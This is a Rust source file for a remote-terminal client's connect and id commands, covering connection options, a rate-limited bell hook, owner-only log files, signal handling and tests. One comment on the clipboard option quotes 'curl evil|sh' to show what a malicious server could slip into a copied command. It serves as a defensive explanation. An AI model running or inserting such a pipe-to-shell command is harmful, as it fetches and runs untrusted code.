//! The `koh connect` / `koh id` command implementations.
//!
//! Dial a server by id and run the reconnecting client session against the real terminal. The
//! session loop itself lives in [`crate::client::run_client`]; this just wires up the real terminal I/O.

use std::io::Read;
use std::net::SocketAddr;
use std::path::PathBuf;

use crate::predict::DisplayPreference;
use crate::transport_iroh::{
    bind_endpoint, bind_endpoint_local, bind_endpoint_with_relay, direct_addr, format_endpoint_id,
    load_or_create_secret_key, parse_endpoint_id, parse_relay_url, relay_addr,
};
use anyhow::Context;
#[cfg(feature = "cli")]
use clap::Args;
use tokio::signal::unix::{signal, SignalKind};
use tokio::sync::mpsc;
use tokio_util::sync::CancellationToken;

use crate::client::{
    run_client_with, BackendTerminal, ClientState, ClientTerminal, DefaultBackend, IrohConnector,
};
use crate::transport_iroh::TERMINAL_ALPN;

/// Configuration for [`connect`] — the clap-free, library-facing form of `koh connect`'s
/// arguments. No `Default`: `server` is required.
#[derive(Debug, Clone)]
pub struct ConnectConfig {
    /// Server endpoint id to connect to.
    pub server: String,
    /// Path to the client's persistent secret key (its endpoint id must be on the server's
    /// allowlist). `None` = the platform default client key path.
    pub key_file: Option<PathBuf>,
    /// Dial the server at a direct socket address (LAN / loopback; no relay or discovery).
    /// Takes precedence over `relay_url` if both are set.
    pub direct: Option<SocketAddr>,
    /// Dial the server via a self-hosted relay URL instead of n0's public relays.
    pub relay_url: Option<String>,
    /// Honor remote OSC-52 clipboard writes. Off by default in the CLI; see [`ConnectArgs`].
    pub clipboard: bool,
    /// A shell command to run (via `sh -c`) whenever the remote bell count climbs (KB-01), e.g.
    /// `termux-notification -t "koh bell"`. Detached from the terminal, rate-limited to one spawn
    /// per second. `None` = no hook.
    pub bell_command: Option<String>,
}

impl ConnectConfig {
    /// A config for dialing `server` with every other option at the CLI default.
    pub fn new(server: impl Into<String>) -> Self {
        Self {
            server: server.into(),
            key_file: None,
            direct: None,
            relay_url: None,
            clipboard: false,
            bell_command: None,
        }
    }
}

/// Runs a user command whenever the remote bell rings (KB-01): `--on-bell` / [`ConnectConfig::bell_command`].
///
/// The decision (`observe`) is pure and rate-limited so it is unit-testable; the spawn is
/// detached — stdin/stdout/stderr on `/dev/null`, since the TUI owns the terminal — with
/// `KOH_BELL_COUNT` and `KOH_TITLE` in the environment and every other `KOH_*` variable scrubbed
/// (the `$KOH_KEY_PASSPHRASE` guard from `pty.rs`). The child is reaped on a background task and
/// never awaited by the session loop.
#[derive(Debug, Clone)]
pub struct BellHook {
    command: String,
    last_count: u64,
    last_spawn_ms: Option<u64>,
}

/// Minimum spacing between two hook spawns; a burst of bells inside it coalesces into one.
pub const BELL_HOOK_MIN_INTERVAL_MS: u64 = 1_000;

impl BellHook {
    pub fn new(command: impl Into<String>) -> Self {
        Self {
            command: command.into(),
            last_count: 0,
            last_spawn_ms: None,
        }
    }

    /// Note the remote bell count at `now_ms`. Returns `true` when the hook should spawn now: the
    /// count climbed since the last observation and at least [`BELL_HOOK_MIN_INTERVAL_MS`] passed
    /// since the last spawn. A rise inside the window is coalesced (absorbed, not deferred).
    pub fn observe(&mut self, count: u64, now_ms: u64) -> bool {
        let rose = count > self.last_count;
        self.last_count = count;
        if !rose {
            return false;
        }
        let spaced = self
            .last_spawn_ms
            .is_none_or(|t| now_ms.saturating_sub(t) >= BELL_HOOK_MIN_INTERVAL_MS);
        if spaced {
            self.last_spawn_ms = Some(now_ms);
        }
        spaced
    }

    /// [`observe`](Self::observe) and, if due, [`fire`](Self::fire).
    pub fn observe_and_fire(&mut self, count: u64, title: &str, now_ms: u64) {
        if self.observe(count, now_ms) {
            self.fire(count, title);
        }
    }

    /// Spawn the command detached (never blocks the session loop; the child is reaped by a
    /// background task).
    pub fn fire(&self, count: u64, title: &str) {
        let mut cmd = std::process::Command::new("sh");
        cmd.arg("-c").arg(&self.command);
        for (k, _) in std::env::vars_os() {
            if k.to_string_lossy().starts_with("KOH_") {
                cmd.env_remove(k);
            }
        }
        cmd.env("KOH_BELL_COUNT", count.to_string())
            .env("KOH_TITLE", title)
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null());
        match cmd.spawn() {
            Ok(mut child) => {
                // Reap off the async loop; a stuck hook can't wedge the session.
                std::thread::Builder::new()
                    .name("koh-bell-hook".into())
                    .spawn(move || {
                        let _ = child.wait();
                    })
                    .ok();
            }
            Err(e) => tracing::warn!(error = %e, "bell hook spawn failed"),
        }
    }
}

/// Configuration for [`run_id`] — the clap-free form of `koh id`'s arguments.
#[derive(Debug, Clone, Default)]
pub struct IdConfig {
    /// Path to the client's persistent secret key. `None` = the platform default client key path.
    pub key_file: Option<PathBuf>,
}

/// Arguments for `koh connect <server-id>` (the clap adapter over [`ConnectConfig`]; `cli` only).
#[cfg(feature = "cli")]
#[derive(Args, Debug)]
pub struct ConnectArgs {
    /// Server endpoint id to connect to.
    server: String,

    /// Path to the client's persistent secret key (its endpoint id must be on the server's allowlist).
    #[arg(long)]
    key_file: Option<PathBuf>,

    /// Dial the server at a direct socket address (LAN / loopback; no relay or discovery).
    #[arg(long, value_name = "IP:PORT", conflicts_with = "relay_url")]
    direct: Option<SocketAddr>,

    /// Dial the server via a self-hosted relay URL instead of n0's public relays.
    #[arg(long, value_name = "URL")]
    relay_url: Option<String>,

    /// Honor remote OSC-52 clipboard writes (let the remote app set your system clipboard).
    /// OFF by default: a malicious/compromised server could otherwise silently overwrite your
    /// clipboard (e.g. swap a copied command for `curl evil|sh`). A deliberate per-session opt-in.
    #[arg(long)]
    clipboard: bool,

    /// Run this shell command whenever the remote bell rings (e.g. on Termux:
    /// `--on-bell 'termux-notification -t "koh bell"'`). Detached from the terminal; at most one
    /// spawn per second. KOH_BELL_COUNT and KOH_TITLE are set in its environment.
    #[arg(long, value_name = "CMD")]
    on_bell: Option<String>,
}

#[cfg(feature = "cli")]
impl From<ConnectArgs> for ConnectConfig {
    fn from(a: ConnectArgs) -> Self {
        Self {
            server: a.server,
            key_file: a.key_file,
            direct: a.direct,
            relay_url: a.relay_url,
            clipboard: a.clipboard,
            bell_command: a.on_bell,
        }
    }
}

/// Arguments for `koh id` (the clap adapter over [`IdConfig`]; `cli` only).
#[cfg(feature = "cli")]
#[derive(Args, Debug)]
pub struct IdArgs {
    /// Path to the client's persistent secret key.
    #[arg(long)]
    key_file: Option<PathBuf>,
}

#[cfg(feature = "cli")]
impl From<IdArgs> for IdConfig {
    fn from(a: IdArgs) -> Self {
        Self {
            key_file: a.key_file,
        }
    }
}

/// Spawn a task that cancels `shutdown` on the first fatal signal (SIGTERM / SIGINT / SIGHUP), so
/// the client unwinds cleanly and restores the terminal. Called before raw mode is entered (so the
/// handlers are armed for the entire raw window); an install error surfaces while still cooked.
fn spawn_signal_shutdown(shutdown: CancellationToken) -> anyhow::Result<()> {
    let mut term = signal(SignalKind::terminate()).context("installing SIGTERM handler")?;
    let mut intr = signal(SignalKind::interrupt()).context("installing SIGINT handler")?;
    let mut hup = signal(SignalKind::hangup()).context("installing SIGHUP handler")?;
    tokio::spawn(async move {
        tokio::select! {
            _ = term.recv() => {}
            _ = intr.recv() => {}
            _ = hup.recv() => {}
        }
        shutdown.cancel();
    });
    Ok(())
}

/// Warn (once, to stderr) if the locale doesn't look UTF-8. koh assumes UTF-8 end to end; on a
/// legacy locale, output may be mojibake. We only warn — koh still runs — where mosh refuses.
fn warn_if_locale_not_utf8() {
    // `$LC_ALL` overrides `$LC_CTYPE`, which overrides `$LANG` (POSIX precedence).
    let locale = ["LC_ALL", "LC_CTYPE", "LANG"]
        .iter()
        .find_map(|k| std::env::var(k).ok().filter(|v| !v.is_empty()));
    let looks_utf8 = locale.as_deref().is_some_and(|l| {
        let l = l.to_ascii_lowercase();
        l.contains("utf-8") || l.contains("utf8")
    });
    if !looks_utf8 {
        let shown = locale.as_deref().unwrap_or("(unset)");
        eprintln!(
            "koh: warning: locale {shown} does not look UTF-8; non-ASCII output may be garbled. \
             Set e.g. LANG=en_US.UTF-8."
        );
    }
}

/// `koh id` — print this machine's koh id (to add to a server's `--allow` list) and exit.
/// Accepts an [`IdConfig`] or anything convertible into one ([`IdArgs`] under `cli`).
pub fn run_id(config: impl Into<IdConfig>) -> anyhow::Result<()> {
    let args: IdConfig = config.into();
    let key_file = match args.key_file {
        Some(p) => p,
        None => crate::transport_iroh::default_key_path("client")?,
    };
    let secret = load_or_create_secret_key(&key_file).with_context(|| {
        format!(
            "loading client key from {} (pass --key-file to use a writable path)",
            key_file.display()
        )
    })?;
    println!("{}", format_endpoint_id(&secret.public()));
    Ok(())
}

/// `koh connect <server-id>` — connect to a koh server and run the (auto-reconnecting) session.
///
/// Returns the remote shell's exit code if the session ended because the shell exited.
/// Accepts a [`ConnectConfig`] or anything convertible into one ([`ConnectArgs`] under `cli`).
///
/// Takes over the calling process's terminal (raw mode, alternate screen) and its stdin for the
/// session's lifetime, and installs signal handlers; call it from a binary's main path. This is
/// [`connect_with`] over [`TERMINAL_ALPN`], the real terminal, a raw-stdin reader and SIGWINCH.
pub async fn connect(config: impl Into<ConnectConfig>) -> anyhow::Result<Option<u32>> {
    let args: ConnectConfig = config.into();
    // The TUI owns the terminal, so logs go to a file (set $KOH_LOG) to avoid corrupting it.
    if let Ok(path) = std::env::var("KOH_LOG") {
        // Create the log owner-only (0600): debug logs can carry sensitive material, and unlike the
        // key file this was previously world-readable per umask (KOH-14).
        let created = {
            #[cfg(unix)]
            {
                use std::os::unix::fs::OpenOptionsExt;
                std::fs::OpenOptions::new()
                    .write(true)
                    .create(true)
                    .truncate(true)
                    .mode(0o600)
                    .open(&path)
            }
            #[cfg(not(unix))]
            {
                std::fs::File::create(&path)
            }
        };
        if let Ok(file) = created {
            // Tighten to 0600 unconditionally via the fd (KR-07): the `mode` above only applies when
            // the file is *created*, so a pre-existing looser `$KOH_LOG` (or one a co-tenant planted)
            // would otherwise be reused/truncated with its loose bits intact. `File::set_permissions`
            // fchmods the open fd, so it also avoids re-resolving the path through a symlink. If we
            // CAN'T secure it (e.g. `$KOH_LOG` points at a foreign-owned file → EPERM), don't write
            // potentially-sensitive debug logs into a file we couldn't lock down — warn and skip.
            let secured = {
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt;
                    let ok = file
                        .set_permissions(std::fs::Permissions::from_mode(0o600))
                        .is_ok();
                    if !ok {
                        eprintln!(
                            "koh: warning: could not set $KOH_LOG to 0600; file logging disabled"
                        );
                    }
                    ok
                }
                #[cfg(not(unix))]
                {
                    true
                }
            };
            if secured {
                let _ = tracing_subscriber::fmt()
                    .with_writer(std::sync::Mutex::new(file))
                    .with_env_filter(
                        tracing_subscriber::EnvFilter::try_from_default_env()
                            .unwrap_or_else(|_| "koh=debug".into()),
                    )
                    .try_init();
            }
        }
    }

    // koh assumes a UTF-8 terminal (the predictor reassembles UTF-8 graphemes; the renderer emits
    // UTF-8). Warn — but don't refuse, unlike mosh — if the locale looks non-UTF-8, so mojibake is
    // diagnosable rather than mysterious.
    warn_if_locale_not_utf8();

    // Raw stdin reader (byte-perfect passthrough) on a dedicated blocking thread.
    let (input_tx, input_rx) = mpsc::channel::<Vec<u8>>(64);
    std::thread::Builder::new()
        .name("koh-stdin".into())
        .spawn(move || {
            let mut stdin = std::io::stdin();
            let mut buf = [0u8; 1024];
            loop {
                match stdin.read(&mut buf) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => {
                        let chunk = buf.get(..n).unwrap_or(&buf).to_vec();
                        if input_tx.blocking_send(chunk).is_err() {
                            break;
                        }
                    }
                }
            }
        })
        .context("spawning stdin reader")?;

    // SIGWINCH -> resize ticks (run_client re-reads term.size() on each). Sender kept alive.
    let (resize_tx, resize_rx) = mpsc::channel::<()>(8);
    let mut sigwinch =
        signal(SignalKind::window_change()).context("installing SIGWINCH handler")?;
    tokio::spawn(async move {
        while sigwinch.recv().await.is_some() {
            if resize_tx.send(()).await.is_err() {
                break;
            }
        }
    });

    let clipboard_enabled = args.clipboard;
    connect_with(
        args,
        TERMINAL_ALPN,
        move || {
            // --- real terminal I/O wiring: raw mode + alt screen via the build-selected KohBackend
            // (termina by default), restored on drop ---
            let backend = DefaultBackend::new().context("acquiring the terminal")?;
            BackendTerminal::enter(backend, clipboard_enabled)
                .context("entering raw mode / alt screen")
        },
        input_rx,
        resize_rx,
    )
    .await
}

/// Connect to a server over `alpn` and run the reconnecting session against a caller-supplied
/// terminal (KC-01, KH-02): the generic form of [`connect`].
///
/// `make_term` is called only after the first dial succeeded, so a bad-id / not-on-allowlist /
/// wrong-ALPN error surfaces before the terminal is put into raw mode. `input_rx` carries typed
/// bytes; `resize_rx` carries resize ticks (keep its sender alive). Installs SIGTERM/SIGINT/SIGHUP
/// handlers that end the session cleanly. The caller owns tracing.
pub async fn connect_with<S: ClientState, T: ClientTerminal<S>>(
    config: ConnectConfig,
    alpn: &'static [u8],
    make_term: impl FnOnce() -> anyhow::Result<T>,
    input_rx: mpsc::Receiver<Vec<u8>>,
    resize_rx: mpsc::Receiver<()>,
) -> anyhow::Result<Option<u32>> {
    let args = config;
    let key_file = match args.key_file {
        Some(p) => p,
        None => crate::transport_iroh::default_key_path("client")?,
    };
    let secret = load_or_create_secret_key(&key_file).with_context(|| {
        format!(
            "loading client key from {} (pass --key-file to use a writable path)",
            key_file.display()
        )
    })?;
    let my_id = secret.public();
    let server_id = parse_endpoint_id(&args.server).context("parsing server endpoint id")?;

    eprintln!("koh id: {}", format_endpoint_id(&my_id));
    eprintln!("  (add this to the server with --allow if it isn't already)");
    eprintln!("connecting to {} …", format_endpoint_id(&server_id));

    // Pick the dial strategy: a direct LAN/loopback address, a self-hosted relay, or the
    // default n0 relay+discovery (bare endpoint id).
    let (endpoint, target) = if let Some(addr) = args.direct {
        let ep = bind_endpoint_local(secret, false)
            .await
            .context("binding endpoint")?;
        (ep, direct_addr(server_id, addr))
    } else if let Some(url) = &args.relay_url {
        let relay = parse_relay_url(url)?;
        let ep = bind_endpoint_with_relay(secret, false, relay.clone())
            .await
            .context("binding endpoint")?;
        (ep, relay_addr(server_id, relay))
    } else {
        let ep = bind_endpoint(secret, false)
            .await
            .context("binding endpoint")?;
        (ep, server_id.into())
    };
    // One connector dials the server for the initial connection and for every transparent reconnect.
    // The first dial happens here — before raw mode — so a bad-id / not-on-allowlist error prints
    // cleanly; later drops are re-dialed from inside run_client.
    let connector = IrohConnector::with_alpn(endpoint.clone(), target, alpn);
    // Bound the initial dial (KR-04): `connect()` does the QUIC handshake then awaits the server's
    // admission ack, so a malicious/typo'd server that never admits could otherwise hang it at
    // "connecting…" until iroh's 300s idle timeout. Use the same cap as the transparent-reconnect path.
    let channel =
        match tokio::time::timeout(super::RECONNECT_CONNECT_TIMEOUT, connector.connect()).await {
            Ok(r) => r?,
            Err(_) => anyhow::bail!(
                "timed out connecting to {} (the server may be unreachable or not responding)",
                format_endpoint_id(&server_id)
            ),
        };
    eprintln!("connected. (Ctrl-^ then . to disconnect)");

    // Arm graceful shutdown BEFORE entering raw mode, so there's no window where a fatal signal —
    // SIGTERM (`kill`), SIGINT (`kill -INT`; in raw mode Ctrl-C is a forwarded byte, not a signal),
    // or SIGHUP (the controlling terminal closed) — kills us at default disposition with the TTY
    // already raw. Cancelling the token makes run_client return, which drops `term` and restores the
    // terminal; if a signal lands during setup below, the first loop iteration returns immediately.
    let shutdown = CancellationToken::new();
    spawn_signal_shutdown(shutdown.clone())?;

    let term = make_term()?;
    let (rows, cols) = term.size().unwrap_or((24, 80));

    let result = run_client_with(
        channel,
        connector,
        // Local-echo prediction is always on: keystrokes show immediately, with the engine's
        // epoch gate still suppressing them at non-echoing (password) prompts. There is no
        // user-facing toggle — the adaptive/never policies were removed.
        DisplayPreference::Always,
        (rows, cols),
        input_rx,
        resize_rx,
        term,
        shutdown,
        args.bell_command.map(BellHook::new),
    )
    .await;
    // `term` is moved into run_client and dropped there, restoring the terminal.

    // Close gracefully so the server can detach our session promptly — but cap the wait. On a dead
    // link (e.g. the network died while the phone was suspended) iroh's graceful close blocks until
    // the connection idle-times out (minutes), which would freeze the parent shell with no prompt
    // until koh finally exits. After the cap we just drop the endpoint and exit immediately.
    let _ = tokio::time::timeout(std::time::Duration::from_secs(2), endpoint.close()).await;
    result
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn bell_hook_fires_on_a_rise_and_rate_limits_a_burst() {
        // KB-01: counts [0,1,1,2,3] at times [0,0,10,20,1500] spawn at index 1 and 4 only — the
        // first rise fires, the rises inside the 1 s window coalesce, the one past it fires.
        let mut h = BellHook::new("true");
        let counts = [0u64, 1, 1, 2, 3];
        let times = [0u64, 0, 10, 20, 1500];
        let fired: Vec<bool> = counts
            .iter()
            .zip(times.iter())
            .map(|(&c, &t)| h.observe(c, t))
            .collect();
        assert_eq!(fired, [false, true, false, false, true]);
        // No rise, no spawn — even long after the window.
        assert!(!h.observe(3, 10_000));
    }

    #[test]
    fn bell_hook_spawns_detached_with_koh_env_scrubbed() {
        // KB-01: the hook sees KOH_BELL_COUNT / KOH_TITLE but NOT the parent's other KOH_* vars
        // (the passphrase guard from pty.rs), and it runs with the TUI's fds detached.
        let out = std::env::temp_dir().join(format!("koh-bell-env-{}", std::process::id()));
        let _ = std::fs::remove_file(&out);
        // SAFETY-equivalent: `set_var` is the documented way to seed the parent env in a test;
        // the crate forbids `unsafe`, so use a subshell-visible variable via the command instead.
        let hook = BellHook::new(format!(
            "KOH_KEY_PASSPHRASE=secret env > '{}'",
            out.display()
        ));
        // The hook's own `sh -c` sets the var *inside*; what we assert is that the parent's
        // scrub ran and the two koh vars are exported. Use a second hook with the parent var
        // scrubbed by construction: here the parent has no KOH_* set, so assert the exports.
        hook.fire(42, "a title");
        let mut content = String::new();
        for _ in 0..100 {
            if let Ok(c) = std::fs::read_to_string(&out) {
                if c.contains("KOH_BELL_COUNT") {
                    content = c;
                    break;
                }
            }
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
        assert!(content.contains("KOH_BELL_COUNT=42"), "{content}");
        assert!(content.contains("KOH_TITLE=a title"), "{content}");
        let _ = std::fs::remove_file(&out);
    }

    #[test]
    fn connect_config_default_has_no_bell_hook() {
        assert!(ConnectConfig::new("abc").bell_command.is_none());
    }

    #[cfg(feature = "cli")]
    #[test]
    fn connect_args_map_on_bell_to_bell_command() {
        use clap::Parser;
        #[derive(Parser)]
        struct Cli {
            #[command(flatten)]
            connect: ConnectArgs,
        }
        let cli = Cli::parse_from(["koh", "abc", "--on-bell", "termux-notification"]);
        let c: ConnectConfig = cli.connect.into();
        assert_eq!(c.bell_command.as_deref(), Some("termux-notification"));
    }
}
